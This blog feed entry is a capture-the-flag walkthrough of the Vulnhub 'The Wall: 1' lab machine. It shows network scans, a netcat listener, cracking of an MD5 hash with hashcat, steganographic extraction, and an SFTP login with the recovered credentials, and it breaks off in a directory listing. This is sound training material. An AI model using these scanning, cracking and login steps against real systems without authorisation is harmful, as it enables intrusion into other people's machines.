<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-12-08T05:13:54-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] The Wall: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/12/07/vulnhub-the-wall-1/"/>
    <updated>2015-12-07T23:13:16-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/12/07/vulnhub-the-wall-1</id>
    <content type="html"><![CDATA[<p>&ldquo;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd&rsquo;s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.</p>

<p>You challenge is simple&hellip; set your controls for the heart of the sun, get root, and grab the flag! Rock on!&ldquo; &ndash; <a href="http://www.mogozobo.com/">Xerubus</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/the-wall-1,130/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: The Wall: 1 (<em>10.1.1.148/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>hidden information reveal</li>
<li>Image steganography exploit</li>
<li>moss code decode</li>
<li>local priv escape by sticky bit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Sniffing local LAN for any suspicious traffic [<font color="FF8000">wireshark</font>]</li>
<li>Multiple times port scan the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Reveal hidden information from source codes and images [<font color="FF8000">steghide</font>]</li>
<li>Crack found hashes and login to SSH on target machine [<font color="FF8000">hashcat</font>]</li>
<li>Enumeration and exploit the vulnerable files which set the sticky bit to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="http://steghide.sourceforge.net/">steghide</a></li>
<li><a href="http://hashcat.net/oclhashcat/">wireshark</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.142 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.148  00:0c:29:31:6b:24   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f5:74:35   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.314 seconds <span class="o">(</span>77.25 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.148</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p>However, this time nothing has been found. It sounds like they are behind &lsquo;the Wall&rsquo;&hellip;:`(</p>

<p>Well, it is wierd for a machine with no ports open, so I decided to have a monitor on local LAN to see if the target machine has any suspicious network traffic.</p>

<p><img class="left" src="/downloads/the_wall/1.png"></p>

<p>Here it is! Looks like the target machine is looking for tcp port <code>1337</code>, so I setup <code>nc</code> to listen on port <code>1337</code> and then got the following information:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvvnp 1337
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1337</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.148<span class="o">]</span> 43892&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                   .u!<span class="s2">&quot;`</span>
</span><span class='line'><span class="s2">               .x*&quot;</span><span class="sb">`</span>
</span><span class='line'>           ..+<span class="s2">&quot;NP</span>
</span><span class='line'><span class="s2">        .z&quot;&quot;   ?</span>
</span><span class='line'><span class="s2">      M#`      9     ,     ,</span>
</span><span class='line'><span class="s2">               9 M  d! ,8P&#39;</span>
</span><span class='line'><span class="s2">               R X.:x&#39; R&#39;  ,</span>
</span><span class='line'><span class="s2">               F F&#39; M  R.d&#39;</span>
</span><span class='line'><span class="s2">               d P  @  E`  ,</span>
</span><span class='line'><span class="s2">  ss           P  &#39;  P  N.d&#39;</span>
</span><span class='line'><span class="s2">   x         &#39;&#39;        &#39;</span>
</span><span class='line'><span class="s2">   X               x             .</span>
</span><span class='line'><span class="s2">   9     .f       !         .    $b</span>
</span><span class='line'><span class="s2">   4;    $k      /         dH    $f</span>
</span><span class='line'><span class="s2">   &#39;X   ;$$     z  .       MR   :$</span>
</span><span class='line'><span class="s2">    R   M$$,   :  d9b      M&#39;   tM</span>
</span><span class='line'><span class="s2">    M:  #&#39;$L  ;&#39; M `8      X    MR</span>
</span><span class='line'><span class="s2">    `$;t&#39; $F  # X ,oR      t    Q;</span>
</span><span class='line'><span class="s2">     $$@  R$ H :RP&#39; $b     X    @&#39;</span>
</span><span class='line'><span class="s2">     9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
</span><span class='line'><span class="s2">     `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
</span><span class='line'><span class="s2">      `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;&#39;</span>
</span><span class='line'>
</span><span class='line'>          The Wall by @xerubus
</span><span class='line'>      -<span class="o">=</span> Welcome to the <span class="nv">Machine</span> <span class="o">=</span>-
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don<span class="p">&amp;</span>rsquo<span class="p">;</span>t be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
</span><span class='line'> sent 0, rcvd <span class="m">1066</span> : Connection reset by peer
</span></code></pre></td></tr></table></div></figure></p>

<p>However, the connection has been automatically closed as soon as we receive the above information. After being stuck for a while, I decided to re-run the ports scan again. Surprisingly, this time TCP port 80 open!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.148/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2015-12-06 04:55:02 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.148
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking the source code of web page, I found the interesting HEX strings at the bottom: <font color='red'><code>737465673d3333313135373330646262623337306663626539373230666536333265633035</code></font></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">&quot;#000000&quot;</span><span class="nt">&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">&quot;pink_floyd.jpg&quot;</span><span class="err">&lt;/</span><span class="na">img</span><span class="nt">&gt;&lt;/center&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span><span class='line'><span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="c">&lt;!--If you want to find out what&#39;s behind these cold eyes, you&#39;ll just have to claw your way through this disguise. - Pink Floyd, The Wall  </span>
</span><span class='line'>
</span><span class='line'><span class="c">Did you know? The Publius Enigma is a mystery surrounding the Division Bell album. Publius promised an unspecified reward for solving the </span>
</span><span class='line'><span class="c">riddle, and further claimed that there was an enigma hidden within the artwork.  </span>
</span><span class='line'>
</span><span class='line'><span class="c">737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After HEX decoding, we got <code>steg=33115730dbbb370fcbe9720fe632ec05</code>, the first thing in my mind when I saw the keyword <code>steg</code> is <code>steganography</code>, some information hidden in the image file. so far, the only image file downloaded from the web page is <code>pink_floyd.jpg</code>.</p>

<p><img class="left" src="/downloads/the_wall/pink_floyd.jpg"></p>

<p>Then I firstly run <code>steghide</code> with password <font color='red'><code>33115730dbbb370fcbe9720fe632ec05</code></font> but could not extract anything&hellip; so I guess this is a MD5 hash, then I use <code>hashcat</code> with dictionary <code>rockyou</code> to crack it and found the password: <font color='red'><code>divisionbell</code></font>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Added hashes from file stegkey.txt: <span class="m">1</span> <span class="o">(</span><span class="m">1</span> salts<span class="o">)</span>
</span><span class='line'>Activating quick-digest mode <span class="k">for</span> single-hash&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;NOTE: press enter <span class="k">for</span> status-screen&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;33115730dbbb370fcbe9720fe632ec05:divisionbell           <span class="p">&amp;</span>lt<span class="p">;&amp;</span>ndash<span class="p">;</span> here is the cracked password!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;All hashes have been recovered&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Input.Mode: Dict <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
</span><span class='line'>Index<span class="p">&amp;</span>hellip<span class="p">;</span>..: 1/5 <span class="o">(</span>segment<span class="o">)</span>, <span class="m">3627099</span> <span class="o">(</span>words<span class="o">)</span>, <span class="m">33550339</span> <span class="o">(</span>bytes<span class="o">)</span>
</span><span class='line'>Recovered.: 1/1 hashes, 1/1 salts
</span><span class='line'>Speed/sec.: - plains, 31.00M words
</span><span class='line'>Progress..: 2063664/3627099 <span class="o">(</span>56.90%<span class="o">)</span>
</span><span class='line'>Running<span class="p">&amp;</span>hellip<span class="p">;</span>: <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>
</span><span class='line'>Estimated.: <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Started: Sun Dec  <span class="m">6</span> 00:12:55 2015
</span><span class='line'>Stopped: Sun Dec  <span class="m">6</span> 00:13:08 2015
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use the new cracked password to extract hidden information from the image file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# steghide <span class="p">&amp;</span>ndash<span class="p">;</span>extract -p divisionbell -sf pink_floyd.jpg
</span><span class='line'>wrote extracted data to <span class="p">&amp;</span>ldquo<span class="p">;</span>pink_floyd_syd.txt<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>root@kali:~/the_wall# cat pink_floyd_syd.txt
</span><span class='line'>Hey Syd,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I hear you<span class="p">&amp;</span>rsquo<span class="p">;</span>re full of dust and guitars?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;If you want to See Emily Play, just use this key: <span class="nv">U3lkQmFycmV0dA</span><span class="o">==</span><span class="p">|</span>f831605ae34c2399d1e5bb3a4ab245d0&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Roger&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
</span><span class='line'>by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
</span><span class='line'>his collection.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/the_wall#
</span></code></pre></td></tr></table></div></figure></p>

<p>From the email file, we noticed that there is a key <code>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0</code>, we can see there are two parts separated by <code>|</code>, first one is base64 encoded and the second one is a MD5 hash.</p>

<p>After cracked the string, we got the first part is <code>SydBarrett</code> and the second part is <code>pinkfloydrocks</code>. This must be a login credential, but the question is where to use it?!</p>

<p>Here I did couple of trails against to the web application but all failed (tried nikto, dirbuster and etc)&hellip; Then I guess there might be some new ports open just like what has happened on port 80, so I re-run the port scan once again.</p>

<p>Woooo, I am right! new port <code>1965</code> discovered by <code>masscan</code>!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.148/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2015-12-06 05:30:16 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.148                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 1965/tcp on 10.1.1.148    &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I run <code>nmap</code> to do a further scan for these two ports.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Sun Dec  <span class="m">6</span> 00:32:59 <span class="m">2015</span> as: nmap -v -sV -O -A -p80,1965 -oN 10.1.1.148_nmap.txt 10.1.1.148&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.148
</span><span class='line'>Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>80/tcp   open  http    OpenBSD httpd
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 405<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: OpenBSD httpd
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>1965/tcp open  ssh     OpenSSH 7.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 70:26:15:de:7b:29:9a:56:a3:eb:33:e0:7e:fb:92:d8 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">256</span> 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> truncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the scanning result, we know that <code>1965</code> is running SSH.</p>

<p>Then go SSH login on port <code>1965</code> with <code>SydBarrett</code> as username and <code>pinkfloydrocks</code> as password, but&hellip; failed&hellip; which the reasons is <code>This service allows sftp connections only</code>.. T.T</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x53;&amp;#x79;&amp;#x64;&amp;#x42;&amp;#97;&amp;#114;&amp;#114;&amp;#x65;&amp;#116;&amp;#116;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#52;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x53;&amp;#121;&amp;#100;&amp;#66;&amp;#x61;&amp;#114;&amp;#x72;&amp;#x65;&amp;#x74;&amp;#116;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#56;&lt;/a&gt; -p1965</span>
</span><span class='line'>The authenticity of host <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.148<span class="o">]</span>:1965 <span class="o">([</span>10.1.1.148<span class="o">]</span>:1965<span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> can<span class="p">&amp;</span>rsquo<span class="p">;</span>t be established.
</span><span class='line'>ECDSA key fingerprint is 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a.
</span><span class='line'>Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no<span class="o">)</span>? yes
</span><span class='line'>Warning: Permanently added <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.148<span class="o">]</span>:1965<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#x53;&amp;#x79;&amp;#100;&amp;#66;&amp;#x61;&amp;#114;&amp;#x72;&amp;#101;&amp;#x74;&amp;#116;&amp;#64;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#52;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#83;&amp;#x79;&amp;#x64;&amp;#66;&amp;#x61;&amp;#x72;&amp;#114;&amp;#x65;&amp;#116;&amp;#x74;&amp;#64;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#52;&amp;#56;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Could not chdir to home directory /home/SydBarrett: No such file or directory
</span><span class='line'>This service allows sftp connections only.
</span><span class='line'>Connection to 10.1.1.148 closed.
</span></code></pre></td></tr></table></div></figure></p>

<p>Ok, now I use sftp and try it again.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# sftp -P <span class="m">1965</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#83;&amp;#x79;&amp;#x64;&amp;#66;&amp;#97;&amp;#114;&amp;#114;&amp;#101;&amp;#x74;&amp;#116;&amp;#x40;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#52;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#83;&amp;#x79;&amp;#x64;&amp;#x42;&amp;#97;&amp;#114;&amp;#x72;&amp;#x65;&amp;#x74;&amp;#116;&amp;#x40;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#52;&amp;#x38;&lt;/a&gt;</span>
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#83;&amp;#121;&amp;#100;&amp;#x42;&amp;#x61;&amp;#114;&amp;#114;&amp;#x65;&amp;#116;&amp;#x74;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x34;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#83;&amp;#x79;&amp;#100;&amp;#66;&amp;#x61;&amp;#x72;&amp;#x72;&amp;#101;&amp;#116;&amp;#116;&amp;#64;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Connected to 10.1.1.148.
</span><span class='line'>sftp&gt; ls -ahl
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 16:16 .
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 16:16 ..
